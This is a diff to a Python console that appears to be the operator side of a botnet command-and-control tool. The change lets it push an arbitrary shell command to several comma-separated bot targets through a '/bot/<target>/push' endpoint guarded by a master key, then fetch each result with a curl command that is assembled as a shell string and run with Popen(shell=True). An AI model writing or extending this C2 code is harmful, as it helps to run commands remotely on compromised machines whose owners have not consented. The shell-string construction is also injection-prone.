@@ -212,24 +212,25 @@ ___  ___          _              _____                       _
         target_list = args.target.split(",")
         print("[DEBUG] target_list = ", target_list)
 
-        url = URL + '/bot/' + args.target + '/push'
-        masterkey = MASTERKEY
-        cmd = args.command 
+        for target in target_list:
+            url = URL + '/bot/' + target + '/push'
+            masterkey = MASTERKEY
+            cmd = args.command 
 
-        data = {'masterkey': masterkey, 'cmd': cmd}
-        res = requests.post(url, data=data)
+            data = {'masterkey': masterkey, 'cmd': cmd}
+            res = requests.post(url, data=data)
 
-        output_push = ansi.style("[+] Command staged for: " + args.target, fg='green', bold=True)
+            output_push = ansi.style("[+] Command staged for: " + target, fg='green', bold=True)
 
-        self.poutput(output_push)
-        self.poutput(res.text)
+            self.poutput(output_push)
+            self.poutput(res.text)
 
-        # If command staging was successful, check the result page after TIMER.
-        if 'result' in res.text:
-            # This "hack" was used due to lack of knowledge of asyncio. Will come back to this... 
-            payload = "sleep " + TIMER + "; echo '\n[" + args.target + "] # " + args.command + "\n==========================================================\n';  curl -X POST -d 'masterkey'='" + MASTERKEY + "' " + URL + "/bot/" + args.target + "/result"
-            #print("[*] payload = ", payload)
-            process = Popen(payload, shell=True)
+            # If command staging was successful, check the result page after TIMER.
+            if 'result' in res.text:
+                # This "hack" was used due to lack of knowledge of asyncio. Will come back to this... 
+                payload = "sleep " + TIMER + "; echo '\n[" + target + "] # " + args.command + "\n==========================================================\n';  curl -X POST -d 'masterkey'='" + MASTERKEY + "' " + URL + "/bot/" + target + "/result"
+                #print("[*] payload = ", payload)
+                process = Popen(payload, shell=True)
 
     broadcast_parser = argparse.ArgumentParser()
     broadcast_parser.add_argument('-c', '--command', type=str, help='Command to push')
